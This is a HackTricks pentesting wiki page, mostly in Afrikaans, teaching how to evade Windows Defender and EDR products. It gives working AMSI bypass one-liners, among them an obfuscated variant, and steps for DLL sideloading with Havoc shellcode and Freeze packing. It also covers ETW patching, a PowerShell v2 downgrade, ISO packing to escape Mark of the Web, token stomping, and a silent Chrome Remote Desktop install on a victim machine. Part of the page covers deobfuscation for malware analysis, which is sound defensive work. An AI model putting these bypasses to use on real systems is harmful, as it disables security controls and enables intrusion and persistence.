# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Hierdie blad is geskryf deur** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): 'n hulpmiddel om Windows Defender te laat ophou werk.
- [no-defender](https://github.com/es3n1n/no-defender): 'n hulpmiddel om Windows Defender te laat ophou werk deur 'n ander AV na te boots.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Tans gebruik AVs verskillende metodes om te bepaal of 'n lêer kwaadwillig is of nie: static detection, dynamic analysis, en vir die meer gevorderde EDRs, behavioural analysis.

### **Static detection**

Static detection word bereik deur bekende kwaadwillige strings of byte-reekse in 'n binary of script te merk, en ook deur inligting uit die lêer self te onttrek (bv. file description, company name, digital signatures, icon, checksum, ens.). Dit beteken dat die gebruik van bekende publieke gereedskap jou makliker kan laat vang, aangesien hulle waarskynlik al ontleed en as kwaadwillig gemerk is. Daar is 'n paar maniere om rondom hierdie soort deteksie te kom:

- **Enkripsie**

As jy die binary enkripteer, sal daar geen manier wees vir AV om jou program te ontdek nie, maar jy sal 'n soort loader nodig hê om die program in geheue te ontsleutel en uit te voer.

- **Obfuskering**

Soms hoef jy net sommige strings in jou binary of script te verander om dit verby AV te kry, maar dit kan 'n tydrowende taak wees afhangend van wat jy probeer obfuskeer.

- **Aangepaste gereedskap**

As jy jou eie gereedskap ontwikkel, sal daar geen bekende slegte signatures wees nie, maar dit verg baie tyd en moeite.

> [!TIP]
> 'n Goeie manier om teen Windows Defender se static detection te toets is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dit verdeel basies die lêer in meerdere segmente en laat Defender elkeen individueel skandeer; op hierdie manier kan dit jou presies sê watter strings of bytes in jou binary gemerk word.

Ek beveel sterk aan dat jy hierdie [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) oor praktiese AV Evasion nagaan.

### **Dynamic analysis**

Dynamic analysis is wanneer die AV jou binary in 'n sandbox laat loop en kyk vir kwaadwillige aktiwiteit (bv. probeer om jou blaaier se wagwoorde te ontsleutel en te lees, 'n minidump op LSASS uitvoer, ens.). Hierdie deel kan 'n bietjie moeiliker wees om mee te werk, maar hier is 'n paar dinge wat jy kan doen om sandboxes te ontduik.

- **Sleep before execution** Afhangend van hoe dit geïmplementeer is, kan dit 'n goeie manier wees om AV se dynamic analysis te omseil. AV's het baie kort tyd om lêers te skandeer sodat hulle nie die gebruiker se werkvloeie ontwrig nie, so die gebruik van lang sleeps kan die analise van binaries ontwrig. Die probleem is dat baie AV-sandboxes die sleep net kan oorslaan afhangend van hoe dit geïmplementeer is.
- **Checking machine's resources** Gewoonlik het Sandboxes baie min hulpbronne om mee te werk (bv. < 2GB RAM), anders sou hulle die gebruiker se masjien kon vertraag. Jy kan hier ook baie kreatief wees, byvoorbeeld deur die CPU se temperatuur of selfs die waaier-snelheid te kontroleer; nie alles sal in die sandbox geïmplementeer wees nie.
- **Machine-specific checks** As jy 'n gebruiker wil teiken wie se werkstasie by die "contoso.local" domein aangesluit is, kan jy 'n kontrole op die rekenaar se domein doen om te sien of dit ooreenstem met die een wat jy gespesifiseer het; as dit nie ooreenstem nie, kan jou program net afsluit.

Dit blyk dat Microsoft Defender se Sandbox computername HAL9TH is, so jy kan vir die computer name in jou malware kyk voordat dit detoneer; as die naam HAL9TH ooreenstem, beteken dit jy is binne Defender se sandbox, dus kan jy jou program laat afsluit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Nog 'n paar regtig goeie wenke van [@mgeeky](https://twitter.com/mariuszbit) om teen Sandboxes te werk

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Soos ons reeds in hierdie pos genoem het, sal **public tools** uiteindelik **gedetekteer word**, so jy moet jouself iets afvra:

Byvoorbeeld, as jy LSASS wil dump, **moet jy regtig mimikatz gebruik**? Of kan jy 'n ander projek gebruik wat minder bekend is en ook LSASS dump?

Die regte antwoord is waarskynlik die laasgenoemde. Neem mimikatz as 'n voorbeeld—dit is waarskynlik een van, indien nie die mees gevlagte stuk malware deur AVs en EDRs nie; terwyl die projek self baie gaaf is, is dit ook 'n nagmerrie om daarmee te werk om rondom AVs te kom, so soek net alternatiewe vir wat jy probeer bereik.

> [!TIP]
> Wanneer jy jou payloads vir evasion wysig, maak seker om **automatic sample submission af te skakel** in Defender, en asseblief, ernstig, **DO NOT UPLOAD TO VIRUSTOTAL** as jou doel is om op die langtermyn evasion te bereik. As jy wil kyk of jou payload deur 'n bepaalde AV gedetekteer word, installeer dit op 'n VM, probeer die automatic sample submission afskakel, en toets daar totdat jy tevrede is met die resultaat.

## EXEs vs DLLs

Sover dit moontlik is, prioritiseer altyd die gebruik van DLLs vir evasion; uit my ervaring word DLL-lêers gewoonlik **veel minder** gedetekteer en ontleed, so dit is 'n baie eenvoudige truuk om te gebruik om waarskynlikheid van opsporing in sekere gevalle te verminder (as jou payload natuurlik op een of ander manier as 'n DLL kan loop).

Soos ons in hierdie beeld kan sien, het 'n DLL Payload van Havoc 'n detection rate van 4/26 op antiscan.me, terwyl die EXE payload 'n 7/26 detection rate het.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Nou gaan ons 'n paar truuks wys wat jy met DLL-lêers kan gebruik om baie meer stealthy te wees.

## DLL Sideloading & Proxying

**DLL Sideloading** maak gebruik van die DLL search order wat deur die loader gebruik word deur beide die slagoffer-toepassing en kwaadwillige payload(s) langs mekaar te plaas.

Jy kan programme wat vatbaar is vir DLL Sideloading kyk met [Siofra](https://github.com/Cybereason/siofra) en die volgende powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Hierdie opdrag gee die lys van programme wat vatbaar is vir DLL hijacking in "C:\Program Files\\" en die DLL-lêers wat hulle probeer laai.

Ek beveel sterk aan dat jy **DLL Hijackable/Sideloadable programs** self ondersoek; hierdie tegniek is redelik stealthy as dit behoorlik gedoen word, maar as jy publiek-bekende DLL Sideloadable programs gebruik, kan jy maklik gevang word.

Net deur 'n kwaadwillige DLL met die naam wat 'n program verwag om te laai te plaas, sal dit nie noodwendig jou payload laai nie, aangesien die program sekere spesifieke funksies binne daardie DLL verwag; om hierdie probleem reg te stel, gaan ons 'n ander tegniek gebruik genaamd **DLL Proxying/Forwarding**.

**DLL Proxying** stuur die aanroepe wat 'n program maak van die proxy (en kwaadwillige) DLL na die oorspronklike DLL deur, en behou sodoende die program se funksionaliteit terwyl dit die uitvoering van jou payload kan hanteer.

Ek gaan die [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projek van [@flangvik](https://twitter.com/Flangvik/) gebruik

Hier is die stappe wat ek gevolg het:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Die laaste opdrag sal ons 2 lêers gee: ’n DLL-bronkode-sjabloon en die oorspronklike hernoemde DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Hier is die resultate:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Beide ons shellcode (gekodeer met [SGN](https://github.com/EgeBalci/sgn)) en die proxy DLL het 'n 0/26 Detection rate op [antiscan.me](https://antiscan.me)! Ek sou dit 'n sukses noem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ek beveel sterk aan dat jy [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading kyk en ook [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) om meer te leer oor wat ons uitgebreider bespreek het.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Jy kan Freeze gebruik om jou shellcode op 'n onopvallende manier te laai en uit te voer.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion is net 'n kat-en-muisspeletjie; wat vandag werk kan môre opgespoor word, moenie net op een hulpmiddel staatmaak nie — probeer, indien moontlik, verskeie evasion techniques aanmekaar skakel.

## AMSI (Anti-Malware Scan Interface)

AMSI is geskep om "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" te voorkom. Aanvanklik kon AVs slegs **files on disk** skandeer, so as jy op een of ander manier payloads **directly in-memory** kon uitvoer, kon die AV niks doen om dit te voorkom nie omdat dit nie genoeg sigbaarheid gehad het nie.

Die AMSI-funksie is geïntegreer in die volgende komponente van Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Dit laat antivirus-oplossings toe om scriptgedrag te inspekteer deur scriptinhoud beskikbaar te stel in 'n vorm wat nie-versleuteld en nie-geobfuskateerd is nie.

Die uitvoering van `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` sal die volgende waarskuwing op Windows Defender produseer.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Let daarop hoe dit `amsi:` voorvoeg en dan die pad na die uitvoerbare lêer van waar die script geloop het, in hierdie geval, powershell.exe

Ons het geen lêer op die skyf geplaas nie, maar is steeds in-memory gevang weens AMSI.

Boonop, vanaf **.NET 4.8**, word C#-kode ook deur AMSI geprosesseer. Dit beïnvloed selfs `Assembly.Load(byte[])` om in-memory uitvoering te laai. Daarom word dit aanbeveel om laer weergawes van .NET (soos 4.7.2 of laer) te gebruik vir in-memory uitvoering as jy AMSI wil evade.

Daar is 'n paar maniere om om AMSI heen te kom:

- **Obfuscation**

Aangesien AMSI hoofsaaklik met statiese deteksies werk, kan dit 'n goeie manier wees om die scripts wat jy probeer laai te wysig om deteksie te ontduik.

AMSI het egter die vermoë om scripts te de-obfuscate selfs al is daar verskeie lae, so obfuscation kan 'n slegte opsie wees afhangend van hoe dit gedoen word. Dit maak dit nie so eenvoudig om te ontduik nie. Soms is alles wat jy hoef te doen om 'n paar veranderlike name te verander en jy is reg, so dit hang af van hoeveel iets gevlag is.

- **AMSI Bypass**

Aangesien AMSI geïmplementeer word deur 'n DLL in die powershell (ook cscript.exe, wscript.exe, ens.) proses te laai, is dit moontlik om dit maklik te manipuleer selfs terwyl jy as 'n onverhoogde gebruiker loop. As gevolg van hierdie tekortkoming in die implementering van AMSI het navorsers verskeie maniere gevind om AMSI-skandering te evade.

**Forcing an Error**

Om die AMSI-initialisering te dwing om te misluk (amsiInitFailed) sal tot gevolg hê dat geen skandering vir die huidige proses geïnisieer sal word nie. Dit is oorspronklik deur [Matt Graeber](https://twitter.com/mattifestation) bekendgemaak en Microsoft het 'n signature ontwikkel om wyer gebruik te voorkom.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Dit het net een reël powershell code geneem om AMSI onbruikbaar te maak vir die huidige powershell-proses. Hierdie reël is natuurlik deur AMSI self gevlag, so 'n aanpassing is nodig om hierdie tegniek te kan gebruik.

Hier is 'n aangepaste AMSI bypass wat ek van hierdie [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) geneem het.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Hou in gedagte dat dit waarskynlik gemerk sal word sodra hierdie pos verskyn, dus moet jy nie enige kode publiseer as jou plan is om onopgemerk te bly nie.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Lees asseblief [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir 'n meer gedetailleerde verduideliking.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

This tools [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Verwyder die opgespoorde handtekening**

Jy kan 'n hulpmiddel gebruik soos **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** en **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** om die opgespoorde AMSI-handtekening uit die geheue van die huidige proses te verwyder. Hierdie hulpmiddel werk deur die geheue van die huidige proses vir die AMSI-handtekening te skandeer en dit dan oor te skryf met NOP-instruksies, wat dit effektief uit die geheue verwyder.

**AV/EDR-produkte wat AMSI gebruik**

Jy kan 'n lys van AV/EDR-produkte wat AMSI gebruik vind by **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Gebruik PowerShell weergawe 2**
As jy PowerShell weergawe 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou skripte kan uitvoer sonder dat AMSI dit skandeer. Jy kan dit soos volg doen:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging is ’n funksie wat jou toelaat om alle PowerShell-opdragte wat op ’n stelsel uitgevoer word, te log. Dit kan nuttig wees vir ouditering en foutopsporing, maar dit kan ook ’n **probleem wees vir attackers wat detection wil ontduik**.

To bypass PowerShell logging, kan jy die volgende tegnieke gebruik:

- **Disable PowerShell Transcription and Module Logging**: Jy kan ’n hulpmiddel soos [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) hiervoor gebruik.
- **Use Powershell version 2**: As jy PowerShell version 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou skripte kan uitvoer sonder om deur AMSI geskan te word. Jy kan dit doen: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Use [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) to spawn a powershell withuot defenses (this is what `powerpick` from Cobal Strike uses).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Wees versigtig hiermee en oorweeg om enkripsie slegs toe te pas op spesifieke afdelings van jou code wat sensitief is of verberg moet word.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Wanneer jy malware ontleed wat ConfuserEx 2 (of kommersiële forks) gebruik, is dit algemeen om verskeie beskermingslae te sien wat dekompileerders en sandboxes sal blokkeer. Die onderstaande werkvloeisel **herstel betroubaar ’n byna‑originele IL** wat daarna gedekompileer kan word na C# in gereedskap soos dnSpy of ILSpy.

1.  Anti-tampering removal – ConfuserEx enkripteer elke *method body* en dekripteer dit binne die *module* static constructor (`<Module>.cctor`). Dit patch ook die PE checksum, so enige wysiging sal die binary laat crash. Gebruik **AntiTamperKiller** om die enkripteerde metadata-tabelle te lokaliseer, die XOR-sleutels te herstel en ’n skoon assembly te herskryf:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Uitset bevat die 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) wat nuttig kan wees wanneer jy jou eie unpacker bou.

2.  Symbol / control-flow recovery – voer die *clean* lêer in by **de4dot-cex** (’n ConfuserEx‑bewuste fork van de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile  
• de4dot sal control-flow flattening ongedaan maak, oorspronklike namespaces, klasse en veranderlike name herstel en konstante strings dekripteer.

3.  Proxy-call stripping – ConfuserEx vervang direkte method calls met liggewig wrappers (a.k.a *proxy calls*) om verdere dekompilasie te breek. Verwyder dit met **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Na hierdie stap behoort jy normale .NET API’s soos `Convert.FromBase64String` of `AES.Create()` te sien in plaas van ondoorgrondelike wrapper-funksies (`Class8.smethod_10`, …).

4.  Manual clean-up – voer die resulterende binary onder dnSpy, soek na groot Base64‑blobbe of `RijndaelManaged`/`TripleDESCryptoServiceProvider` gebruik om die *regte* payload te lokaliseer. Dikwels berg die malware dit as ’n TLV‑geënkodeerde byte‑reeks wat binne `<Module>.byte_0` geïnitialiseer is.

Die bogenoemde ketting herstel die uitvoeringsvloei **sonder** om die kwaadwillige monster te hoef uit te voer – nuttig wanneer jy op ’n offline workstation werk.

> 🛈  ConfuserEx produseer ’n pasgemaakte attribuut genaamd `ConfusedByAttribute` wat as IOC gebruik kan word om monsters outomaties te triageer.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om 'n open-source fork van die [LLVM](http://www.llvm.org/) kompilasiesuite te bied wat verhoogde sagteware-sekuriteit deur code obfuscation en tamper-proofing moontlik maak.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe om die `C++11/14` taal te gebruik om, by compile time, obfuscated code te genereer sonder om enige eksterne hulpmiddel te gebruik en sonder om die compiler te wysig.
- [**obfy**](https://github.com/fritzone/obfy): Voeg 'n laag van obfuscated operations by wat deur die C++ template metaprogramming framework gegenereer word, wat dit vir iemand wat die toepassing wil kraak 'n bietjie moeiliker maak.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is 'n x64 binary obfuscator wat in staat is om verskeie verskillende pe files te obfuskeer, insluitend: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame is 'n eenvoudige metamorphic code engine vir arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is 'n fijnkorrelige code obfuscation framework vir LLVM-supported languages wat ROP (return-oriented programming) gebruik. ROPfuscator obfuskeer 'n program op die assembly code-vlak deur gewone instrukesies in ROP chains te transformeer, en ondermyn so ons natuurlike begrip van normale control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is 'n .NET PE Crypter geskryf in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kan bestaande EXE/DLL omskakel na shellcode en hulle daarna laai

## SmartScreen & MoTW

Jy het dalk hierdie skerm gesien wanneer jy executables vanaf die internet aflaai en uitvoer.

Microsoft Defender SmartScreen is 'n sekuriteitsmeganisme wat bedoel is om die eindgebruiker te beskerm teen die uitvoering van potensieel kwaadwillige toepassings.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen werk hoofsaaklik op 'n reputasie-gebaseerde benadering, wat beteken dat seldsaam afgelaaide toepassings SmartScreen sal aktiveer, en die eindgebruiker waarsku en verhinder om die lêer uit te voer (alhoewel die lêer steeds uitgevoer kan word deur op More Info -> Run anyway te klik).

**MoTW** (Mark of The Web) is 'n [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) met die naam Zone.Identifier wat outomaties geskep word wanneer lêers vanaf die internet afgelaai word, saam met die URL waarvan dit afgelaai is.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kontroleer die Zone.Identifier ADS vir 'n lêer wat vanaf die internet afgelaai is.</p></figcaption></figure>

> [!TIP]
> Dit is belangrik om daarop te let dat executables wat met 'n **trusted** signing certificate onderteken is, **nie** SmartScreen sal aktiveer nie.

'n Baie effektiewe manier om te verhoed dat jou payloads die Mark of The Web kry, is om hulle binne 'n soort houer soos 'n ISO te verpak. Dit gebeur omdat Mark-of-the-Web (MOTW) nie toegepas kan word op **non NTFS** volumes nie.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is 'n hulpmiddel wat payloads in uitsethouers verpak om Mark-of-the-Web te ontduik.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo om SmartScreen te omseil deur payloads in ISO-lêers te verpak met [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is 'n kragtige logboekmeganisme in Windows wat toepassings en stelselkomponente toelaat om **gebeure te registreer**. Dit kan egter ook deur sekuriteitsprodukte gebruik word om kwaadwillige aktiwiteite te monitor en op te spoor.

Net soos hoe AMSI gedeaktiveer (omseil) word, is dit ook moontlik om die **`EtwEventWrite`** funksie van die user-space proses onmiddellik te laat terugkeer sonder om enige gebeure te registreer. Dit word gedoen deur die funksie in geheue te patch sodat dit onmiddellik terugkeer, wat ETW-logging effektief vir daardie proses deaktiveer.

Jy kan meer inligting vind by **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly-refleksie

Die laai van C# binaries in geheue is al 'n geruime tyd bekend en dit is steeds 'n baie goeie manier om jou post-exploitation gereedskap te laat loop sonder om deur AV gevang te word.

Aangesien die payload direk in geheue gelaai word sonder om die skyf te raak, sal ons slegs hoef te bekommer oor die patching van AMSI vir die hele proses.

Die meeste C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, ens.) bied reeds die vermoë om C# assemblies direk in geheue uit te voer, maar daar is verskillende maniere om dit te doen:

- **Fork\&Run**

Dit behels die skep van 'n nuwe opofferingsproses, injekteer jou post-exploitation kwaadwillige kode in daardie nuwe proses, voer jou kwaadwillige kode uit en wanneer klaar, beëindig die nuwe proses. Dit het beide voordele en nadele. Die voordeel van die fork-and-run metode is dat die uitvoering **buite** ons Beacon implant-proses gebeur. Dit beteken dat as iets in ons post-exploitation aksie verkeerd gaan of gevang word, daar 'n **veel groter kans** is dat ons **implant oorleef.** Die nadeel is dat jy 'n **groter kans** het om deur **Behavioural Detections** gevang te word.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dit gaan oor die inspuit van die post-exploitation kwaadwillige kode **in sy eie proses**. Op hierdie manier kan jy die skep van 'n nuwe proses en die risiko dat dit deur AV gescan word, vermy, maar die nadeel is dat as iets verkeerd gaan met die uitvoering van jou payload, daar 'n **veel groter kans** is dat jy jou **beacon verloor** aangesien dit kan crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> As jy meer wil lees oor C# Assembly loading, kyk asseblief na hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Jy kan ook C# Assemblies **from PowerShell** laai, kyk na [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) en [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Gebruik van Ander Programmeringstale

Soos voorgestel in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), is dit moontlik om kwaadwillige kode uit te voer met ander tale deur die gekompromitteerde masjien toegang te gee tot die interpreter-omgewing wat op die Attacker Controlled SMB share geïnstalleer is.

Deur toegang tot die Interpreter Binaries en die omgewing op die SMB-share toe te laat, kan jy **arbitrêre kode in hierdie tale binne die geheue** van die gekompromitteerde masjien uitvoer.

Die repo dui aan: Defender scan nog steeds die skripte, maar deur Go, Java, PHP ens. te gebruik het ons **meer buigsaamheid om statiese handtekeninge te omseil**. Toetse met ewekansige nie-geobfuskate reverse shell skripte in hierdie tale het sukses bewys.

## TokenStomping

Token stomping is 'n tegniek wat 'n aanvaller toelaat om die access token of 'n sekuriteitsproduk soos 'n EDR of AV te manipuleer, waardeur hulle die priviliges kan verlaag sodat die proses nie sal sterf nie, maar nie die toestemmings het om na kwaadwillige aktiwiteite te kyk nie.

Om dit te voorkom, kan Windows **voorkom dat eksterne prosesse** handvatsels oor die tokens van sekuriteitsprosesse kry.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Gebruik van Vertroude Sagteware

### Chrome Remote Desktop

Soos beskryf in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), is dit maklik om net Chrome Remote Desktop op 'n slagoffer se rekenaar te installeer en dit dan te gebruik om dit oor te neem en persistent te bly:
1. Laai af vanaf https://remotedesktop.google.com/, klik op "Set up via SSH", en klik dan op die MSI-lêer vir Windows om die MSI-lêer af te laai.
2. Hardloop die installer stil in die slagoffer (admin benodig): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gaan terug na die Chrome Remote Desktop-bladsy en klik next. Die wizard sal jou dan vra om te authoriseer; klik die Authorize-knoppie om voort te gaan.
4. Voer die gegewe parameter uit met 'n paar aanpassings: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Let op die pin-param wat toelaat om die pin sonder die GUI te stel).


## Gevorderde Ontduiking

Ontduiking is 'n baie ingewikkelde onderwerp; soms moet jy baie verskillende bronne van telemetrie in net een stelsel in ag neem, so dit is feitlik onmoontlik om heeltemal onopgemerk te bly in volwasse omgewings.

Elke omgewing wat jy teëkom sal sy eie sterk- en swakpunte hê.

Ek beveel sterk aan dat jy hierdie praatjie van [@ATTL4S](https://twitter.com/DaniLJ94) kyk om 'n voet in die deur te kry vir meer Gevorderde Ontduiking tegnieke.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Hier is ook nog 'n uitstekende praatjie van [@mariuszbit](https://twitter.com/mariuszbit) oor Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Oude Tegnieke**

### **Check which parts Defender finds as malicious**

Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik wat dele van die binary **verwyder** totdat dit **uitvind watter deel Defender** as kwaadwillig beskou en dit vir jou opsplits.\
